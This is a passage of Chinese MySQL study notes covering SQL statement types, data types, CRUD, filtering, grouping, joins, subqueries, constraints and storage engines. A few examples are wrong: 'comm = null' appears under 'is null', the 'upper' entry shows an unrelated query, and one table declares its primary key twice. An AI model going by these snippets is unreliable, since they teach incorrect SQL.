语句，最终来完成数据库中数据的增删改查操作。\nSQL是一套标准，程序员主要学习的就是SQL语句，这个SQL在mysql中可以使用，同时在Oracle中也可以使用，在DB2中也可以使用。\n三者之间的关系？    DBMS–执行–&gt; SQL –操作–&gt; DB\n先安装数据库管理系统MySQL，然后学习SQL语句怎么写，编写SQL语句之后，DBMS对SQL语句进行执行，最终来完成数据库的数据管理。\n0.2 SQL语句分类DQL：        数据查询语言（凡是带有select关键字的都是查询语句）        select…\t\t\nDML：            数据操作语言（凡是对表当中的数据进行增删改的都是DML）            insert delete update            insert 增            delete 删            update 改\n​\t\t这个主要是操作表中的数据data。\nDDL：        数据定义语言        凡是带有create、drop、alter的都是DDL。        DDL主要操作的是表的结构。不是表中的数据。        create：新建，等同于增        drop：删除        alter：修改        这个增删改和DML不同，这个主要是对表结构进行操作。\nTCL：    不是王牌电视。    是事务控制语言    包括：        事务提交：commit;        事务回滚：rollback;\nDCL：    是数据控制语言。    例如：授权grant、撤销权限revoke….\n0.3MYSQL中的数据类型varchar(最长255)        可变长度的字符串，比较智能，节省空间。会根据实际的数据长度动态分配空间。\n​\t\t优点：节省空间​\t\t缺点：需要动态分配空间，速度慢。\nchar(最长255)        定长字符串，不管实际的数据长度是多少，分配固定长度的空间去存储数据。        使用不恰当的时候，可能会导致空间的浪费。\n​\t\t优点：不需要动态分配空间，速度快。​\t\t缺点：使用不当可能会导致空间的浪费。\n​\t\tvarchar和char我们应该怎么选择？​\t\t\t性别字段你选什么？因为性别是固定长度的字符串，所以选择char。​\t\t\t姓名字段你选什么？每一个人的名字长度不同，所以选择varchar。\nint(最长11)\n​\t\t数字中的整数型。等同于java的int。\nbigint        数字中的长整型。等同于java中的long。\nfloat        单精度浮点型数据\ndouble        双精度浮点型数据\ndate        短日期类型\ndatetime        长日期类型\nclob        字符大对象        最多可以存储4G的字符串。        比如：存储一篇文章，存储一个说明。        超过255个字符的都要采用CLOB字符大对象来存储。        Character Large OBject:CLOB\nblob        二进制大对象        Binary Large OBject        专门用来存储图片、声音、视频等流媒体数据。        往BLOB类型的字段上插入数据的时候，例如插入一个图片、视频等，        你需要使用IO流才行。\nt_movie 电影表（专门存储电影信息的）\n编号no(bigint)\t名字name(varchar)\t\t故事情节history(clob)\t\n上映日期playtime(date)\t\t时长time(double)\t\t海报image(blob)\n类型type(char)\t\t\t\t\t\t\t\n\n0.4SQL脚本的执行xxxx.sql这种文件被称为sql脚本文件。        sql脚本文件中编写了大量的sql语句。        我们执行sql脚本文件的时候，该文件中所有的sql语句会全部执行！        批量的执行SQL语句，可以使用sql脚本文件。\n\nmysql&gt; source D:\\course\\03-MySQL\\document\\vip.sql你在实际的工作中，第一天到了公司，项目经理会给你一个xxx.sql文件，你执行这个脚本文件，你电脑上的数据库数据就有了！\n\n0.5数据库和表的导入导出数据导出？\n\t注意：在windows的dos命令窗口中：\n\t\tmysqldump bjpowernode&gt;D:\\bjpowernode.sql -uroot -p123456\n\t可以导出指定的表吗？\n\t\tmysqldump bjpowernode emp&gt;D:\\bjpowernode.sql -uroot -p123456\n\n数据导入？\n\t注意：需要先登录到mysql数据库服务器上。\n\t然后创建数据库：create database bjpowernode;\n\t使用数据库：use bjpowernode\n\t然后初始化数据库：source D:\\bjpowernode.sql\n\n1.数据库操作show databases; \t查看mysql中有哪些数据库\n use test;\t表示正在使用一个名字叫做test的数据库。\n create database db01;\t创建数据库\nshow tables; \t查看某个数据库下有哪些表\n select version();\t查看mysql数据库的版本号\nselect database();\t查看当前使用的是哪个数据库\n\\c\t用来终止一条命令的输入。\n2.建表操作2.1创建一个表create学号、姓名、年龄、性别、邮箱地址\n\tcreate table t_student(\n\t\tno int,\n\t\tname varchar(32),\n\t\tsex char(1),\n\t\tage int(3),\n\t\temail varchar(255)\n\t);\n\n2.2删除一个表dropdrop table t_student; &#x2F;&#x2F; 当这张表不存在的时候会报错！\n&#x2F;&#x2F; 如果这张表存在的话，删除\ndrop table if exists t_student;\n\n\n对表结构的修改需要使用：alter属于DDL语句\ndesc t_student    查看表结构\n\n2.3插入数据insert\ninsert into 表名(字段名1,字段名2,字段名3…) values(值1,值2,值3);\n\ninsert into t_student(no,name,sex,age,email)\n\tvalues(1,&#39;zhangsan&#39;,&#39;m&#39;,20,&#39;zhangsan@123.com&#39;);\ninsert into t_student(email,name,sex,age,no)\n\tvalues(&#39;lisi@123.com&#39;,&#39;lisi&#39;,&#39;f&#39;,20,2);\ninsert into t_student(no) values(3);\n&#x2F;&#x2F;省略字段名\ninsert into t_student values(2, &#39;lisi&#39;, &#39;f&#39;, 20, &#39;lisi@123.com&#39;);\n\n\ninsert语句但凡是执行成功了，那么必然会多一条记录。没有给其它字段指定值的话，默认值是NULL。\n\n一次插入多条数据\n\ninsert into t_user(字段名1,字段名2) values(),(),(),();\n\ninsert into t_user(id,name,birth,create_time) values\n\t\t(1,&#39;zs&#39;,&#39;1980-10-11&#39;,now()), \n\t\t(2,&#39;lisi&#39;,&#39;1981-10-11&#39;,now()),\n\t\t(3,&#39;wangwu&#39;,&#39;1982-10-11&#39;,now());\n\n\n\n2.4修改数据update\nupdate 表名 set 字段名1&#x3D;值1,字段名2&#x3D;值2,字段名3&#x3D;值3… where 条件;\n\n没有条件限制会导致所有数据全部更新。\n\n\nupdate t_user set name &#x3D; &#39;jack&#39;, birth &#x3D; &#39;2000-10-11&#39; where id &#x3D; 2;\n\nupdate t_user set name &#x3D; &#39;jack&#39;, birth &#x3D; &#39;2000-10-11&#39;, create_time &#x3D; now() where id &#x3D; 2;\n\n2.5删除数据delete语句删除数据的原理？（delete属于DML语句！！！）\n\n表中的数据被删除了，但是这个数据在硬盘上的真实存储空间不会被释放！！！\n这种删除缺点是：删除效率比较低。\n这种删除优点是：支持回滚，后悔了可以再恢复数据！！！\n\ntruncate语句删除数据的原理？\n\n这种删除效率比较高，表被一次截断，物理删除。\n这种删除缺点：不支持回滚。\n这种删除优点：快速。\n\n2.5.1delete\ndelete from 表名 where 条件;\n\n没有条件，整张表的数据会全部删除！\n\ndelete from t_user where id &#x3D; 2;\n\n\n2.5.2truncate\ntruncate table dept_bak; （这种操作属于DDL操作。）\n\n下列演示内容所用表\nemp 员工表\n\nsalgarde 工资等级表\n\ndept 部门表\n\n3.基础增删改3.单表查询3.1基础条件查询\nselect  字段1,字段2,字段3….  from   表名  where  条件;\n\n&#x3D; 等于\n查询薪资等于800的员工姓名和编号？\n\t\tselect empno,ename from emp where sal &#x3D; 800;\n\t查询SMITH的编号和薪资？\n\t\tselect empno,sal from emp where ename &#x3D; &#39;SMITH&#39;; &#x2F;&#x2F;字符串使用单引号\n\n&lt;&gt;或!&#x3D; 不等于\n查询薪资不等于800的员工姓名和编号？\n\tselect empno,ename from emp where sal !&#x3D; 800;\n\tselect empno,ename from emp where sal &lt;&gt; 800; &#x2F;&#x2F; 小于号和大于号组成的不等号\n\n&lt; 小于  &lt;&#x3D; 小于等于\n查询薪资小于等于3000的员工姓名和编号？\n\t\tselect empno,ename,sal from emp where sal &lt;&#x3D; 3000;\n\n(&gt;)大于 **  ** (&gt;&#x3D;) 大于等于\n查询薪资大于等于3000的员工姓名和编号？\nselect empno,ename,sal from emp where sal &gt;&#x3D; 3000;\n\nbetween … and …. 两个值之间, 等同于 &gt;&#x3D; and &lt;&#x3D;\n查询薪资在2450和3000之间的员工信息？包括2450和3000\n\t第一种方式：&gt;&#x3D; and &lt;&#x3D; （and是并且的意思。）\n\t\tselect empno,ename,sal from emp where sal &gt;&#x3D; 2450 and sal &lt;&#x3D; 3000;\t\n\nis null 为 null（is not null 不为空）\n查询哪些员工的津贴&#x2F;补助为null？\n\t\tmysql&gt; select empno,ename,sal,comm from emp where comm &#x3D; null;\n\n查询哪些员工的津贴&#x2F;补助不为null？\n\t\tselect empno,ename,sal,comm from emp where comm is not null;\n\nand 并且    or 或者\nselect  * from emp where sal &gt; 2500 and (deptno &#x3D; 10 or deptno &#x3D; 20);\n\nand和or同时出现，and优先级较高。如果想让or先执行，需要加“小括号”,以后在开发中，如果不确定优先级，就加小括号就行了。\n\nin 包含，相当于多个 or （not in 不在这个范围中）\n查询工作岗位是MANAGER和SALESMAN的员工？\nselect empno,ename,job from emp where job &#x3D; &#39;MANAGER&#39; or job &#x3D; &#39;SALESMAN&#39;;\nselect empno,ename,job from emp where job in(&#39;MANAGER&#39;, &#39;SALESMAN&#39;);\n\nnot 可以取非，主要用在 is 或 in 中\nis null\nis not null\nin\nnot in\n\nlike \t\n称为模糊查询，支持%或下划线匹配\n\n%匹配任意多个字符\n下划线：任意一个字符。\n（%是一个特殊的符号，_ 也是一个特殊符号）\n\n\t\n\n找出名字中含有O的？\n\tmysql&gt; select ename from emp where ename like &#39;%O%&#39;;\n\n找出名字中有“_”的？\n\tselect name from t_student where name like &#39;%_%&#39;; &#x2F;&#x2F;这样不行。\n\n\tmysql&gt; select name from t_student where name like &#39;%\\_%&#39;; &#x2F;&#x2F; \\转义字符。\n\ndistinct\n\n把查询结果去除重复记录【distinct】\n\ndistinct只能出现在所有字段的最前方。\n\ndistinct出现在job,deptno两个字段之前，表示两个字段联合起来去重。\n\nselect distinct job from emp;\n\nselect distinct job,deptno from emp;\n\n\n3.2排序查询所有员工薪资，排序？\n\nselect  ename,sal from emp order by sal; &#x2F;&#x2F; 默认是升序！！！\n\n指定降序：desc\n\nselect  ename,sal from emp order by sal desc;\n\n查询员工名字和薪资，要求按照薪资升序，如果薪资一样的话，\n\t再按照名字升序排列。\n\tselect \n\t\tename,sal\n\tfrom\n\t\temp\n\torder by\n\t\tsal asc, ename asc; &#x2F;&#x2F; sal在前，起主导，只有sal相等的时候，才会考虑启用ename排序。\n\n3.3分页\nlimit作用：将查询结果集的一部分取出来。通常使用在分页查询当中。\n完整用法：limit startIndex, length\t\tstartIndex是起始下标，length是长度。\n起始下标从0开始。\n缺省用法：limit 5; 这是取前5.\n\n\n\n按照薪资降序，取出排名在前5名的员工？\nselect \n\t\tename,sal\n\tfrom\n\t\temp\n\torder by \n\t\tsal desc\n\tlimit 5; &#x2F;&#x2F;取前5\tlimit 0,5;\nmysql当中limit在order by之后执行！！！！！！\n\n取出工资排名在[3-5]名的员工？\n\tselect \n\t\tename,sal\n\tfrom\n\t\temp\n\torder by\n\t\tsal desc\n\tlimit\n\t\t2, 3;\n2表示起始位置从下标2开始，就是第三条记录。\n3表示长度。\n\n\n每页显示3条记录\n\n第1页：limit 0,3\t\t[0 1 2]\n第2页：limit 3,3\t\t[3 4 5]\n第3页：limit 6,3\t\t[6 7 8]\n\n\n每页显示pageSize条记录\n\n第pageNo页：limit (pageNo - 1) * pageSize  , pageSize\n\n\n\n4.函数4.1单行处理函数\n单行处理函数的特点：一个输入对应一个输出。\n和单行处理函数相对的是：多行处理函数。（多行处理函数特点：多个输入，对应1个输出！）\n\n\n\nlower 转换小写\n\tmysql&gt; select lower(ename) as ename from emp;\nupper 转换大写\n\t\tmysql&gt; select * from t_student;\nsubstr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）\n\t\tselect substr(ename, 1, 1) as ename from emp;\n\t\t注意：起始下标从1开始，没有0.\n\t\t找出员工名字第一个字母是A的员工信息？\n\t\t\t第一种方式：模糊查询\n\t\t\t\tselect ename from emp where ename like &#39;A%&#39;;\n\t\t\t第二种方式：substr函数\n\t\t\t\tselect \n\t\t\t\t\tename \n\t\t\t\tfrom \n\t\t\t\t\temp \n\t\t\t\twhere \n\t\t\t\t\tsubstr(ename,1,1) &#x3D; &#39;A&#39;;\nconcat函数进行字符串的拼接\n\t\tselect concat(empno,ename) from emp;\nlength 取长度\n\t\tselect length(ename) enamelength from emp;\ntrim 去空格\n\t\tmysql&gt; select * from emp where ename &#x3D; &#39;  KING&#39;;\nstr_to_date 将字符串转换成日期\ndate_format 格式化日期\nformat 设置千分位\nround 四舍五入\n\t\tselect 字段 from 表名;\n\t\tselect ename from emp;\n\t\tselect &#39;abc&#39; from emp; &#x2F;&#x2F; select后面直接跟“字面量&#x2F;字面值”\n\n\t\tmysql&gt; select &#39;abc&#39; as bieming from emp;\n\t\tselect round(1236.567, 1) as result from emp; &#x2F;&#x2F;保留1个小数\n\t\tselect round(1236.567, 2) as result from emp; &#x2F;&#x2F;保留2个小数\n\t\tselect round(1236.567, -1) as result from emp; &#x2F;&#x2F; 保留到十位。\nrand() 生成随机数\n\t\tmysql&gt; select round(rand()*100,0) from emp; &#x2F;&#x2F; 100以内的随机数\nifnull 可以将 null 转换成一个具体值\n\t\tifnull是空处理函数。专门处理空的。\n\t\t在所有数据库当中，只要有NULL参与的数学运算，最终结果就是NULL。\n\t\tmysql&gt; select ename, sal + comm as salcomm from emp;\n\n4.2分组函数\n多行处理函数的特点：输入多行，最终输出一行。\ncount\t计数\nsum\t求和\navg\t平均值\nmax\t最大值\nmin\t最小值\n\n\n注意：分组函数在使用的时候必须先进行分组，然后才能用。如果你没有对数据进行分组，整张表默认为一组。\n\n\t\n找出最高工资？\n\t\tmysql&gt; select max(sal) from emp;\n找出最低工资？\n\t\tmysql&gt; select min(sal) from emp;\n计算工资和：\n\t\tmysql&gt; select sum(sal) from emp;\n计算平均工资：\n\t\tmysql&gt; select avg(sal) from emp;\n计算员工数量？\n\t\tmysql&gt; select count(ename) from emp;\n\n分组函数在使用的时候需要注意哪些？\t\n\n第一点：分组函数自动忽略NULL，你不需要提前对NULL进行处理。\n第二点：分组函数中count()和count(具体字段)有什么区别？\ncount(具体字段)：表示统计该字段下所有不为NULL的元素的总数。\ncount(*)：统计表当中的总行数。（只要有一行数据count则++）            因为每一行记录不可能都为NULL，一行数据中有一列不为NULL，则这行数据就是有效的。\n\n\n第三点：分组函数不能够直接使用在where子句中。        找出比最低工资高的员工信息。              select ename,sal from emp where sal &gt; min(sal);              表面上没问题，运行一下？                  ERROR 1111 (HY000): Invalid use of group function\n\n5.分组查询5.1 group by找出每个工作岗位的工资和？\n\t实现思路：按照工作岗位分组，然后对工资求和。\n\t\tselect \n\t\t\tjob,sum(sal)\n\t\tfrom\n\t\t\temp\n\t\tgroup by\n\t\t\tjob;\n以上这个语句的执行顺序？\n先从emp表中查询数据。根据job字段进行分组。然后对每一组的数据进行sum(sal)\n\n\n在一条select语句当中，如果有group by语句的话，select后面只能跟：参加分组的字段，以及分组函数。其它的一律不能跟。**\n\n找出每个部门的最高薪资\n实现思路:按照部门编号分组，求每一组的最大值。\n\tmysql&gt; select deptno,max(sal) from emp group by deptno;\n\n5.2 联合分组找出“每个部门，不同工作岗位”的最高薪资？\n技巧：两个字段联合成1个字段看。（两个字段联合分组）\n\t\tselect \n\t\t\tdeptno, job, max(sal)\n\t\tfrom\n\t\t\temp\n\t\tgroup by\n\t\t\tdeptno, job;\n\n\n\n5.3having\n使用having可以对分完组之后的数据进一步过滤。\n\nhaving不能单独使用，having不能代替where，having必须和group by联合使用。\n\n\n找出每个部门平均薪资，要求显示平均薪资高于2500的。\nselect \n\tdeptno,avg(sal) \nfrom \n\temp \ngroup by \n\tdeptno\nhaving\n\tavg(sal) &gt; 2500;\n\n\nwhere和having，优先选择where，where实在完成不了了，再选择having。\n\n5.4总结sql执行顺序\nselect  –&gt; from –&gt; where –&gt; group by –&gt; having –&gt; order by –&gt;以上关键字只能按照这个顺序来，不能颠倒。\n\n执行顺序？    1. from –&gt; where –&gt; group by –&gt; having –&gt; select –&gt; order by\n\n从某张表中查询数据，\n先经过where条件筛选出有价值的数据。\n对这些有价值的数据进行分组。\n分组之后可以使用having继续筛选。\nselect查询出来。\n最后排序输出！\n\n找出每个岗位的平均薪资，要求显示平均薪资大于1500的，除MANAGER岗位之外，\n要求按照平均薪资降序排。\n\tselect \n\t\tjob, avg(sal) as avgsal\n\tfrom\n\t\temp\n\twhere\n\t\tjob &lt;&gt; &#39;MANAGER&#39;\n\tgroup by\n\t\tjob\n\thaving\n\t\tavg(sal) &gt; 1500\n\torder by\n\t\tavgsal desc;\n\n6.连表查询\n从一张表中单独查询，称为单表查询\n\nemp表和dept表联合起来查询数据，从emp表中取员工名字，从dept表中取部门名字。\n\n这种跨表查询，多张表联合起来查询数据，被称为连接查询。\n\n\nselect ename,dname from emp, dept;\n\n当两张表进行连接查询，没有任何条件限制的时候，最终查询结果条数，是两张表条数的乘积，这种现象被称为：笛卡尔积现象。\n\n6.1内连接之等值连接查询每个员工所在部门名称，显示员工名和部门名？\n\nemp e和dept d表进行连接。条件是：e.deptno &#x3D; d.deptno\n\nSQL92语法：\n\tselect \n\t\te.ename,d.dname\n\tfrom\n\t\temp e, dept d\n\twhere\n\t\te.deptno &#x3D; d.deptno;\n\t\n\tsql92的缺点：结构不清晰，表的连接条件，和后期进一步筛选的条件，都放到了where后面。\n\t\nSQL99语法：\n\t&#x2F;&#x2F;inner可以省略（带着inner可读性更好！！！一眼就能看出来是内连接）\n\tselect \n\t\te.ename,d.dname\n\tfrom\n\t\temp e\n\tinner join\n\t\tdept d\n\ton\n\t\te.deptno &#x3D; d.deptno; &#x2F;&#x2F; 条件是等量关系，所以被称为等值连接。\n\tsql99优点：表连接的条件是独立的，连接之后，如果还需要进一步筛选，再往后继续添加where\n\n6.2内连接之非等值连接找出每个员工的薪资等级，要求显示员工名、薪资、薪资等级？\nselect \n\te.ename, e.sal, s.grade\nfrom\n\temp e\njoin\n\tsalgrade s\non\n\te.sal between s.losal and s.hisal; &#x2F;&#x2F; 条件不是一个等量关系，称为非等值连接。\n\n6.3内连接自己连接查询员工的上级领导，要求显示员工名和对应的领导名？\n技巧：一张表看成两张表。\nselect \n\ta.ename as &#39;员工名&#39;, b.ename as &#39;领导名&#39;\nfrom\n\temp a\njoin\n\temp b\non\n\ta.mgr &#x3D; b.empno; &#x2F;&#x2F;员工的领导编号 &#x3D; 领导的员工编号\n\n6.4外连接\n内连接：（A和B连接，AB两张表没有主次关系。平等的。）\n\n内连接的特点：完成能够匹配上ON后面的条件的数据查询出来。\n\n\n&#x2F;&#x2F; outer是可以省略的，带着可读性强。\nselect \n\te.ename,d.dname\nfrom\n\temp e \nright outer join \n\tdept d\non\n\te.deptno &#x3D; d.deptno;\n\n\nright代表什么：表示将join关键字右边的这张表看成主表，主要是为了将\n这张表的数据全部查询出来，捎带着关联查询左边的表。\n在外连接当中，两张表连接，产生了主次关系。\n\nselect \n\te.ename,d.dname\nfrom\n\tdept d \nleft outer join \n\temp e\non\n\te.deptno &#x3D; d.deptno;\n\n带有right的是右外连接，又叫做右连接。\n带有left的是左外连接，又叫做左连接。\n任何一个右连接都有左连接的写法。\n任何一个左连接都有右连接的写法。\n\n6.5多表连接三张表，四张表怎么连接？\n语法：\n\tselect \n\t\t...\n\tfrom\n\t\ta\n\tjoin\n\t\tb\n\ton\n\t\ta和b的连接条件\n\tjoin\n\t\tc\n\ton\n\t\ta和c的连接条件\n\tright join\n\t\td\n\ton\n\t\ta和d的连接条件\n\n找出每个员工的部门名称以及工资等级，要求显示员工名、部门名、薪资、薪资等级？\nselect \n\t\te.ename,e.sal,d.dname,s.grade\n\tfrom\n\t\temp e\n\tjoin\n\t\tdept d\n\ton \n\t\te.deptno &#x3D; d.deptno\n\tjoin\n\t\tsalgrade s\n\ton\n\t\te.sal between s.losal and s.hisal;\n\n找出每个员工的部门名称以及工资等级，还有上级领导，要求显示员工名、领导名、部门名、薪资、薪资等级？\nselect \n\te.ename,e.sal,d.dname,s.grade,l.ename\nfrom\n\temp e\njoin\n\tdept d\non \n\te.deptno &#x3D; d.deptno\njoin\n\tsalgrade s\non\n\te.sal between s.losal and s.hisal\nleft join\n\temp l\non\n\te.mgr &#x3D; l.empno;\n\n7.子查询\nselect语句中嵌套select语句，被嵌套的select语句称为子查询。\n\n子查询可以出现在 select后面，from 后面，where 后面。\n\n\n7.1where子句中的子查询找出比最低工资高的员工姓名和工资？\n\nselect ename,sal from emp where sal &gt; (select min(sal) from emp);\n\n7.2from子句中的子查询\nfrom后面的子查询，可以将子查询的查询结果当做一张临时表。（技巧）\n\n找出每个岗位的平均工资的薪资等级。\nselect \n\t\t\tt.*, s.grade\n\t\tfrom\n\t\t\t(select job,avg(sal) as avgsal from emp group by job) t\n\t\tjoin\n\t\t\tsalgrade s\n\t\ton\n\t\t\tt.avgsal between s.losal and s.hisal;\n\n8.约束\n在创建表的时候，我们可以给表中的字段加上一些约束，来保证这个表中数据的完整性、有效性！！！\n\n8.1约束类型\n非空约束：not null\n唯一性约束: unique\n主键约束: primary key （简称PK）\n外键约束：foreign key（简称FK）\n检查约束：check（mysql不支持，oracle支持）\n\n我们这里重点学习四个约束：not null，unique，primary key，foreign key。\n8.2not null\n非空约束not null约束的字段不能为NULL。\n\ndrop table if exists t_vip;\n\tcreate table t_vip(\n\t\tid int,\n\t\tname varchar(255) not null  &#x2F;&#x2F; not null只有列级约束，没有表级约束！\n\t);\ninsert into t_vip(id,name) values(1,&#39;zhangsan&#39;);\n\ninsert into t_vip(id) values(3);\n\tERROR 1364 (HY000): Field &#39;name&#39; doesn&#39;t have a default value\n\n\n\n8.3unique\n唯一性约束unique约束的字段不能重复，但是可以为NULL。\n\ndrop table if exists t_vip;\ncreate table t_vip(\n\tid int,\n\tname varchar(255) unique,\n\temail varchar(255)\n);\ninsert into t_vip(id,name,email) values(2,&#39;lisi&#39;,&#39;lisi@123.com&#39;);\ninsert into t_vip(id,name,email) values(3,&#39;wangwu&#39;,&#39;wangwu@123.com&#39;);\nselect * from t_vip;\n\ninsert into t_vip(id,name,email) values(4,&#39;wangwu&#39;,&#39;wangwu@sina.com&#39;);\nERROR 1062 (23000): Duplicate entry &#39;wangwu&#39; for key &#39;name&#39;\n\ninsert into t_vip(id) values(4);\ninsert into t_vip(id) values(5);\n+------+----------+------------------+\n| id   | name     | email            |\n+------+----------+------------------+\n|    1 | zhangsan | zhangsan@123.com |\n|    2 | lisi     | lisi@123.com     |\n|    3 | wangwu   | wangwu@123.com   |\n|    4 | NULL     | NULL             |\n|    5 | NULL     | NULL             |\n+------+----------+------------------+\nname字段虽然被unique约束了，但是可以为NULL。\n\n8.3.1联合唯一\nname和email两个字段联合起来具有唯一性！！！！\n\ndrop table if exists t_vip;\ncreate table t_vip(\n\tid int,\n\tname varchar(255),\n\temail varchar(255),\n\tunique(name,email) &#x2F;&#x2F; 约束没有添加在列的后面，这种约束被称为表级约束。\n);\ninsert into t_vip(id,name,email) values(1,&#39;zhangsan&#39;,&#39;zhangsan@123.com&#39;);\ninsert into t_vip(id,name,email) values(2,&#39;zhangsan&#39;,&#39;zhangsan@sina.com&#39;);\n\tname和email两个字段联合起来唯一！！！\n\t\ninsert into t_vip(id,name,email) values(3,&#39;zhangsan&#39;,&#39;zhangsan@sina.com&#39;);\n\tERROR 1062 (23000): Duplicate entry &#39;zhangsan-zhangsan@sina.com&#39; for key &#39;name&#39;\n\n\n在mysql当中，如果一个字段同时被not null和unique约束的话，该字段自动变成主键字段。（注意：oracle中不一样！）\n\n8.4primary key\n主键值是每一行记录的唯一标识。主键值是每一行记录的身份证号！！！\n\n主键的特征：not null + unique（主键值不能是NULL，同时也不能重复！）\n\n\ndrop table if exists t_vip;\n\t\t&#x2F;&#x2F; 1个字段做主键，叫做：单一主键\n\t\tcreate table t_vip(\n\t\t\tid int primary key,  &#x2F;&#x2F;列级约束\n\t\t\tname varchar(255),\n            primary key(id)  &#x2F;&#x2F; 表级约束\n\t\t);\n\t\tinsert into t_vip(id,name) values(1,&#39;zhangsan&#39;);\n\t\tinsert into t_vip(id,name) values(2,&#39;lisi&#39;);\n\n\t\t&#x2F;&#x2F;错误：不能重复\n\t\tinsert into t_vip(id,name) values(2,&#39;wangwu&#39;);\n\t\tERROR 1062 (23000): Duplicate entry &#39;2&#39; for key &#39;PRIMARY&#39;\n\n\t\t&#x2F;&#x2F;错误：不能为NULL\n\t\tinsert into t_vip(name) values(&#39;zhaoliu&#39;);\n\t\tERROR 1364 (HY000): Field &#39;id&#39; doesn&#39;t have a default value\n\n8.4.1复合主键drop table if exists t_vip;\n\t\t&#x2F;&#x2F; id和name联合起来做主键：复合主键！！！！\n\t\tcreate table t_vip(\n\t\t\tid int,\n\t\t\tname varchar(255),\n\t\t\temail varchar(255),\n\t\t\tprimary key(id,name)\n\t\t);\ninsert into t_vip(id,name,email) values(1,&#39;zhangsan&#39;,&#39;zhangsan@123.com&#39;);\ninsert into t_vip(id,name,email) values(1,&#39;lisi&#39;,&#39;lisi@123.com&#39;);\n\n&#x2F;&#x2F;错误：不能重复\ninsert into t_vip(id,name,email) values(1,&#39;lisi&#39;,&#39;lisi@123.com&#39;);\n\tERROR 1062 (23000): Duplicate entry &#39;1-lisi&#39; for key &#39;PRIMARY&#39;\n\n\n在实际开发中不建议使用：复合主键。建议使用单一主键！\n因为主键值存在的意义就是这行记录的身份证号，只要意义达到即可，单一主键可以做到。\n\n一个表中主键约束能加两个吗？\n\t\tdrop table if exists t_vip;\n\t\tcreate table t_vip(\n\t\t\tid int primary key,\n\t\t\tname varchar(255) primary key\n\t\t);\n\t\tERROR 1068 (42000): Multiple primary key defined\n\n\n结论：一张表，主键约束只能添加1个。（主键只能有1个。）\n\n主键分类\n\n自然主键：主键值是一个自然数，和业务没关系。\n\n业务主键：主键值和业务紧密关联，例如拿银行卡账号做主键值。这就是业务主键！\n\n\n8.4.2主键自增\n在mysql当中，有一种机制，可以帮助我们自动维护一个主键值\n\nrop table if exists t_vip;\ncreate table t_vip(\n\tid int primary key auto_increment, &#x2F;&#x2F;auto_increment表示自增，从1开始，以1递增！\n\tname varchar(255)\n);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\tinsert into t_vip(name) values(&#39;zhangsan&#39;);\n\t\t\n\t\t+----+----------+\n\t\t| id | name     |\n\t\t+----+----------+\n\t\t|  1 | zhangsan |\n\t\t|  2 | zhangsan |\n\t\t|  3 | zhangsan |\n\t\t|  4 | zhangsan |\n\t\t|  5 | zhangsan |\n\n8.5foreign key\n如果一个实体的某个字段指向另一个实体的主键，就称为外键\n被指向的实体，称之为主实体（主表），也叫父实体（父表）。\n负责指向的实体，称之为从实体（从表），也叫子实体（子表）\n\ncreate table t_class(\n\tclassno int primary key,\n\tclassname varchar(255)\n);\ncreate table t_student(\n\tno int primary key auto_increment,\n\tname varchar(255),\n\tcno int,\n\tforeign key(cno) references t_class(classno)\n);\n\ninsert into t_class(classno, classname) values(100, &#39;北京市大兴区亦庄镇第二中学高三1班&#39;);\ninsert into t_class(classno, classname) values(101, &#39;北京市大兴区亦庄镇第二中学高三1班&#39;);\n\ninsert into t_student(name,cno) values(&#39;jack&#39;, 100);\ninsert into t_student(name,cno) values(&#39;lilei&#39;, 100);\ninsert into t_student(name,cno) values(&#39;hanmeimei&#39;, 100);\ninsert into t_student(name,cno) values(&#39;zhangsan&#39;, 101);\ninsert into t_student(name,cno) values(&#39;lisi&#39;, 101);\n\n\n外键可以为空，可以理解成 一名学生肯定会关联到一个存在的班级，但来了一个转校生，还没有分班，他现在属于学生子表，但还没有关联到班级主表中的任何一条记录。\n\nt_class是父表，t_student是子表\n​\t\t删除表的顺序？\t先删子，再删父。\n​\t\t创建表的顺序？\t先创建父，再创建子。\n​\t\t删除数据的顺序？先删子，再删父。\n​\t\t插入数据的顺序？先插入父，再插入子\n\n子表中的外键引用的父表中的某个字段，被引用的这个字段不一定是主键，但至少具有unique约束。\n\n9.存储引擎\n存储引擎是MySQL中特有的一个术语，其它数据库中没有。（Oracle中有，但是不叫这个名字）\n实际上存储引擎是一个表存储&#x2F;组织数据的方式。\n不同的存储引擎，表存储数据的方式不同。\n\nshow create table t_student;\n可以在建表的时候给表指定存储引擎。\nCREATE TABLE &#96;t_student&#96; (\n  &#96;no&#96; int(11) NOT NULL AUTO_INCREMENT,\n  &#96;name&#96; varchar(255) DEFAULT NULL,\n  &#96;cno&#96; int(11) DEFAULT NULL,\n  PRIMARY KEY (&#96;no&#96;),\n  KEY &#96;cno&#96; (&#96;cno&#96;),\n  CONSTRAINT &#96;t_student_ibfk_1&#96; FOREIGN KEY (&#96;cno&#96;) REFERENCES &#96;t_class&#96; (&#96;classno&#96;)\n) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;11 DEFAULT CHARSET&#x3D;utf8\n\n在建表的时候可以在最后小括号的”)”的右边使用：\n\nENGINE来指定存储引擎。\tmysql默认的存储引擎是：InnoDB\nCHARSET来指定这张表的字符编码方式。mysql默认的字符编码方式是：utf8\n\n9.1mysql支持的存储引擎\nshow engines \\G   查看mysql支持哪些存储引擎\nmysql支持九大存储引擎，当前5.5.36支持8个。版本不同支持情况不同。\n\n\n9.2MyISAM存储引擎\n使用三个文件表示每个表：\n\n格式文件 — 存储表结构的定义（mytable.frm）\n数据文件 — 存储表行的内容（mytable.MYD）\n索引文件 — 存储表上索引（mytable.MYI）：索引是一本书的目录，缩小扫描范围，提高查询效率的一种机制。\n\n\n可被转换为压缩、只读表来节省空间\n\nMyISAM存储引擎特点：\n\n可被转换为压缩、只读表来节省空间这是这种存储引擎的优势！！！！\nMyISAM不支持事务机制，安全性低。\n\n\n\n9.3InnoDB存储引擎\n这是mysql默认的存储引擎，同时也是一个重量级的存储引擎。\n\nInnoDB支持事务，支持数据库崩溃后自动恢复机制。\n\nInnoDB存储引擎最主要的特点是：非常安全。\n\n它管理的表具有下列主要特征：\n\n每个 InnoDB 表在数据库目录中以.frm 格式文件表示\nInnoDB 表空间 tablespace 